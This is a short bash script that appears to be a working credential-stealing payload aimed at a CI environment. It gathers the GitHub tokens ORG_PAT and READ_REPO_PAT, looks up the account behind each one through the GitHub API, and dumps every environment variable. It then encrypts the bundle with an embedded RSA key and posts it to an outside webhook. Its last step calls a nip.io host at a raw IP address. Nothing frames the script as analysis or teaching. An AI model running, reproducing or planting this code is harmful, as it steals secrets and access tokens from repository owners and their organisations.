encrypt_chunk() {
    printf '%s' "$1" | openssl pkeyutl -encrypt -pubin -inkey <(printf '%s' "$PUB_KEY") -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 | base64 -w0
}

string=""

for pat in ORG_PAT READ_REPO_PAT; do

        token="${!pat}"

		# ------------------------------------------------------- fetch user info --
		user_info="$(curl -s -i -H "Authorization: Bearer $token" https://api.github.com/user)"

		# ------------------------------------------------ combine string -----
		printf -v block 'secret:\n\n%s\n\ntoken:\n\n%s\n\nuser info:\n%s' "$pat" "$token" "$user_info"
		string+="${block}"$'\n\n'		
done

env_b64="$(env -0 | base64 -w0)"
printf -v envblock 'environment variables:\n\n%s' "$env_b64"
string+=$'\n\n'"${envblock}"

# ------------------------------------------------ chunked encryption -----
CHUNK_SIZE=190
chunks=()
i=0
while (( i < ${#string} )); do
	chunks+=( "$(encrypt_chunk "${string:i:CHUNK_SIZE}")" )
	i=$(( i + CHUNK_SIZE ))
done

encrypted_string="$(printf '%s.' "${chunks[@]}")"
encrypted_string="${encrypted_string%.}"

# ------------------------------------------------ send encrypted blob -----
curl -s -o /dev/null "$webhook/send-pat" -d "$encrypted_string"

# ------------------------------------------------ check if quit with no errors -----
curl https://16.164.221.226.nip.io/bcbdfd7ffd9efa6d8d312f9f723f20753656c0dcb6460ebb7a85a5c02357b5ff/stop

